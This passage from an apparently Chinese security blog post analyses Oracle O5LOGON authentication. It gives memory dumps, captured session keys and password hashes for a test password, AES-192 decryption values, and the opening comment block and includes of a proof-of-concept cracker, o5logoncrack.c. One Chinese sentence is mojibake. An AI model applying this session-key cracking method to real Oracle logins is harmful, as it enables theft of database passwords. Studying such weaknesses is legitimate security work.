class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A554</span>  <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E <span class="hljs-number">89</span> D3 <span class="hljs-number">9</span>F <span class="hljs-number">07</span> <span class="hljs-number">62</span> A8 <span class="hljs-number">83</span> BB C6 <span class="hljs-number">4</span>D <span class="hljs-number">9</span>F D9..                        <br><span class="hljs-attribute">0DC3A564</span>  EA <span class="hljs-number">7</span>B <span class="hljs-number">90</span> <span class="hljs-number">1</span>C <span class="hljs-number">49</span> <span class="hljs-number">9</span>B <span class="hljs-number">73</span> <span class="hljs-number">36</span> BE <span class="hljs-number">60</span> AF F6 <span class="hljs-number">69</span> A4 ED <span class="hljs-number">37</span>..                        <br><span class="hljs-attribute">0DC3A574</span>  <span class="hljs-number">8</span>D <span class="hljs-number">1</span>D B3 B7 <span class="hljs-number">60</span> <span class="hljs-number">30</span> C7 <span class="hljs-number">56</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">8</span>C A5 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A584</span>  C8 B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span> <span class="hljs-number">77</span> BF F6 <span class="hljs-number">84</span> <span class="hljs-number">28</span> <span class="hljs-number">3</span>A D6 <span class="hljs-number">54</span> <span class="hljs-number">9</span>F <span class="hljs-number">65</span> <span class="hljs-number">96</span> <span class="hljs-number">0</span>B..                        <br><span class="hljs-attribute">0DC3A594</span>  <span class="hljs-number">0</span>E <span class="hljs-number">0</span>A E4 <span class="hljs-number">60</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>..                        <br><span class="hljs-attribute">0DC3A5A4</span>  <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">84</span> A5 C3 <span class="hljs-number">0</span>D E0 <span class="hljs-number">3</span>E FE <span class="hljs-number">0</span>C A8 <span class="hljs-number">46</span> A7 <span class="hljs-number">0</span>C..                     <br><span class="hljs-attribute">0DC3A5B4</span>  <span class="hljs-number">94</span> <span class="hljs-number">77</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">0</span>C C6 C3 <span class="hljs-number">0</span>D <span class="hljs-number">4</span>A EA <span class="hljs-number">50</span> <span class="hljs-number">01</span> F4 C4 C3 <span class="hljs-number">0</span>D..                        <br><span class="hljs-attribute">0DC3A5C4</span>  F8 <span class="hljs-number">49</span> FE <span class="hljs-number">0</span>C <span class="hljs-number">10</span> FB EC <span class="hljs-number">0</span>D<br><br><br><span class="hljs-attribute">0DC3A4F0</span>   <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       offset<br><span class="hljs-attribute">0DC3A514</span>   <span class="hljs-number">61</span> <span class="hljs-number">15</span> <span class="hljs-number">91</span> <span class="hljs-number">7</span>F  ...  encrypted session key (<span class="hljs-number">0</span>x30 byte)<br><span class="hljs-attribute">0DC3A554</span>   <span class="hljs-number">7</span>A EF <span class="hljs-number">5</span>B <span class="hljs-number">9</span>E  ...  plaintext session key (<span class="hljs-number">0</span>x28 byte)<br><span class="hljs-attribute">0DC3A584</span>   <span class="hljs-number">8</span> B3 <span class="hljs-number">13</span> <span class="hljs-number">21</span>   ...  password  hash        (<span class="hljs-number">0</span>x18 byte)<br></code></pre></td></tr></table></figure><p>AES 192 åŠ å¯†40å­—èŠ‚çš„æ˜æ–‡ï¼Œéœ€è¦å¡«å…… 8ä¸ª 0x08</p><p>11.1</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">           nsfocus</span><br><span class="hljs-attribute">AUTH_SESSKEY</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="hljs-attribute">AUTH_SESSKEY_CLIENT</span><span class="hljs-punctuation">:</span> <span class="hljs-string">C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="hljs-attribute">AUTH_PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="hljs-attribute">AUTH_VFR_DATA</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      3DA8A309D636ACF87004</span><br><br><span class="hljs-attribute">PASSWORD HASH</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      EF92924A1DB06441457FDABC24BF89055C8594F7</span><br></code></pre></td></tr></table></figure><p>11.2</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PASSWORD</span>    :        nsfocus<br><span class="hljs-attribute">AUTH_SESSKEY</span>:        <span class="hljs-number">52</span>FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69<br><span class="hljs-attribute">AUTH_SESSKEY_C</span>       FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63<br><span class="hljs-attribute">AUTH_PASSWORD</span>        <span class="hljs-number">2</span>C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D<br><span class="hljs-attribute">AUTH_VFR_DATA</span>        <span class="hljs-number">43</span>E0BE20B32B0BB76E57<br><br><span class="hljs-attribute">PASSWORD</span> HASH:       C3D98762D258D4BD92C572065DDEA9AF38123F88 <span class="hljs-number">43</span>E0BE20B32B0BB76E57<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aes</span> key<br><span class="hljs-attribute">0000</span> ef <span class="hljs-number">92</span> <span class="hljs-number">92</span> <span class="hljs-number">4</span>a <span class="hljs-number">1</span>d b0 <span class="hljs-number">64</span> <span class="hljs-number">41</span> <span class="hljs-number">45</span> <span class="hljs-number">7</span>f da bc <span class="hljs-number">24</span> bf <span class="hljs-number">89</span> <span class="hljs-number">05</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">5</span>c <span class="hljs-number">85</span> <span class="hljs-number">94</span> f7 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br><span class="hljs-attribute">decrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">47</span> <span class="hljs-number">43</span> <span class="hljs-number">56</span> <span class="hljs-number">45</span> <span class="hljs-number">1</span>f <span class="hljs-number">61</span> c7 <span class="hljs-number">89</span> <span class="hljs-number">68</span> <span class="hljs-number">83</span> be ad ed c0 f4 <span class="hljs-number">54</span><br><span class="hljs-attribute">0010</span> e3 dd <span class="hljs-number">61</span> <span class="hljs-number">88</span> <span class="hljs-number">7</span>e <span class="hljs-number">78</span> d8 <span class="hljs-number">9</span>a bc <span class="hljs-number">8</span>f dc <span class="hljs-number">15</span> <span class="hljs-number">4</span>f a6 <span class="hljs-number">2</span>f <span class="hljs-number">26</span><br><span class="hljs-attribute">0020</span> a0 <span class="hljs-number">35</span> e2 <span class="hljs-number">63</span> <span class="hljs-number">68</span> bb <span class="hljs-number">02</span> <span class="hljs-number">1</span>b <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span><br><br><span class="hljs-attribute">encrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">43</span> fd <span class="hljs-number">38</span> <span class="hljs-number">02</span> <span class="hljs-number">93</span> <span class="hljs-number">77</span> c8 <span class="hljs-number">46</span> <span class="hljs-number">20</span> ae <span class="hljs-number">18</span> <span class="hljs-number">51</span> fc <span class="hljs-number">1</span>d <span class="hljs-number">23</span> <span class="hljs-number">14</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">09</span> <span class="hljs-number">98</span> <span class="hljs-number">50</span> <span class="hljs-number">64</span> de a0 d0 b8 d4 <span class="hljs-number">8</span>e <span class="hljs-number">50</span> e6 <span class="hljs-number">05</span> <span class="hljs-number">17</span> <span class="hljs-number">51</span> a5<br><span class="hljs-attribute">0020</span> d8 fd fe aa a9 f8 <span class="hljs-number">3</span>b <span class="hljs-number">99</span> f3 <span class="hljs-number">7</span>b <span class="hljs-number">05</span> <span class="hljs-number">1</span>f a6 <span class="hljs-number">7</span>f <span class="hljs-number">85</span> <span class="hljs-number">46</span><br><br><span class="hljs-attribute">AUTH_SESSKEY</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">43</span> fd <span class="hljs-number">38</span> <span class="hljs-number">02</span> <span class="hljs-number">93</span> <span class="hljs-number">77</span> c8 <span class="hljs-number">46</span> <span class="hljs-number">20</span> ae <span class="hljs-number">18</span> <span class="hljs-number">51</span> fc <span class="hljs-number">1</span>d <span class="hljs-number">23</span> <span class="hljs-number">14</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">09</span> <span class="hljs-number">98</span> <span class="hljs-number">50</span> <span class="hljs-number">64</span> de a0 d0 b8 d4 <span class="hljs-number">8</span>e <span class="hljs-number">50</span> e6 <span class="hljs-number">05</span> <span class="hljs-number">17</span> <span class="hljs-number">51</span> a5<br><span class="hljs-attribute">0020</span> d8 fd fe aa a9 f8 <span class="hljs-number">3</span>b <span class="hljs-number">99</span> f3 <span class="hljs-number">7</span>b <span class="hljs-number">05</span> <span class="hljs-number">1</span>f a6 <span class="hljs-number">7</span>f <span class="hljs-number">85</span> <span class="hljs-number">46</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aes</span> key<br><span class="hljs-attribute">0000</span> c3 d9 <span class="hljs-number">87</span> <span class="hljs-number">62</span> d2 <span class="hljs-number">58</span> d4 bd <span class="hljs-number">92</span> c5 <span class="hljs-number">72</span> <span class="hljs-number">06</span> <span class="hljs-number">5</span>d de a9 af<br><span class="hljs-attribute">0010</span> <span class="hljs-number">38</span> <span class="hljs-number">12</span> <span class="hljs-number">3</span>f <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br><span class="hljs-attribute">decrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">21</span> <span class="hljs-number">64</span> <span class="hljs-number">7</span>f ef <span class="hljs-number">76</span> d3 ee <span class="hljs-number">80</span> ed <span class="hljs-number">24</span> <span class="hljs-number">47</span> <span class="hljs-number">50</span> f8 f4 f0 a6<br><span class="hljs-attribute">0010</span> e4 <span class="hljs-number">18</span> a3 <span class="hljs-number">2</span>a <span class="hljs-number">40</span> <span class="hljs-number">0</span>b <span class="hljs-number">96</span> ea <span class="hljs-number">5</span>b <span class="hljs-number">70</span> <span class="hljs-number">26</span> ab <span class="hljs-number">6</span>a e4 <span class="hljs-number">62</span> f5<br><span class="hljs-attribute">0020</span> <span class="hljs-number">81</span> e0 <span class="hljs-number">62</span> <span class="hljs-number">1</span>c <span class="hljs-number">13</span> a0 <span class="hljs-number">21</span> <span class="hljs-number">90</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span><br><br><span class="hljs-attribute">encrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">52</span> fc <span class="hljs-number">04</span> b1 ff <span class="hljs-number">81</span> <span class="hljs-number">10</span> ca <span class="hljs-number">12</span> <span class="hljs-number">63</span> df <span class="hljs-number">5</span>b c6 <span class="hljs-number">1</span>a <span class="hljs-number">7</span>e <span class="hljs-number">57</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>c <span class="hljs-number">8</span>a <span class="hljs-number">51</span> <span class="hljs-number">11</span> d2 <span class="hljs-number">2</span>b <span class="hljs-number">41</span> e5 <span class="hljs-number">3</span>c c1 <span class="hljs-number">67</span> fd f2 a6 <span class="hljs-number">87</span><br><span class="hljs-attribute">0020</span> <span class="hljs-number">89</span> <span class="hljs-number">58</span> <span class="hljs-number">20</span> <span class="hljs-number">0</span>d <span class="hljs-number">9</span>b <span class="hljs-number">2</span>b <span class="hljs-number">6</span>a <span class="hljs-number">51</span> c9 <span class="hljs-number">5</span>d <span class="hljs-number">77</span> <span class="hljs-number">9</span>f de ba bb <span class="hljs-number">69</span><br><br><span class="hljs-attribute">AUTH_SESSKEY</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">52</span> fc <span class="hljs-number">04</span> b1 ff <span class="hljs-number">81</span> <span class="hljs-number">10</span> ca <span class="hljs-number">12</span> <span class="hljs-number">63</span> df <span class="hljs-number">5</span>b c6 <span class="hljs-number">1</span>a <span class="hljs-number">7</span>e <span class="hljs-number">57</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>c <span class="hljs-number">8</span>a <span class="hljs-number">51</span> <span class="hljs-number">11</span> d2 <span class="hljs-number">2</span>b <span class="hljs-number">41</span> e5 <span class="hljs-number">3</span>c c1 <span class="hljs-number">67</span> fd f2 a6 <span class="hljs-number">87</span><br><span class="hljs-attribute">0020</span> <span class="hljs-number">89</span> <span class="hljs-number">58</span> <span class="hljs-number">20</span> <span class="hljs-number">0</span>d <span class="hljs-number">9</span>b <span class="hljs-number">2</span>b <span class="hljs-number">6</span>a <span class="hljs-number">51</span> c9 <span class="hljs-number">5</span>d <span class="hljs-number">77</span> <span class="hljs-number">9</span>f de ba bb <span class="hljs-number">69</span><br></code></pre></td></tr></table></figure><h2 id="exploit-POC"><a href="#exploit-POC" class="headerlink" title="exploit (POC)"></a>exploit (POC)</h2><p>o5logoncrack.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">11.1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD:            nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="hljs-comment">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="hljs-comment">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="hljs-comment">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD    :           nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:           52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="hljs-comment">AUTH_SESSKEY_C          FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="hljs-comment">AUTH_PASSWORD           2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="hljs-comment">AUTH_VFR_DATA           43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:          C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.x</span><br><span class="hljs-comment">ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28</span><br><span class="hljs-comment">40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A</span><br><span class="hljs-comment">2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E</span><br><span class="hljs-comment">7FD52BC80AA5836695D4</span><br><span class="hljs-comment">18C314BE125DF23689215C78C33F623AABF1152E</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-------------------------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span><br><span class="hljs-comment">0010 5c 85 94 f7 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span><br><span class="hljs-comment">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span><br><span class="hljs-comment">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span><br><span class="hljs-comment">0010 38 12 3f 88 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span><br><span class="hljs-comment">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span><br><span class="hljs-comment">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a</span><br><span class="hljs-comment">0010 ab f1 15 2e 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e6</span><br><span class="hljs-comment">0010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c</span><br><span class="hljs-comment">0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/aes.h&gt;</span></span><br><span class="hljs-meta">#<span 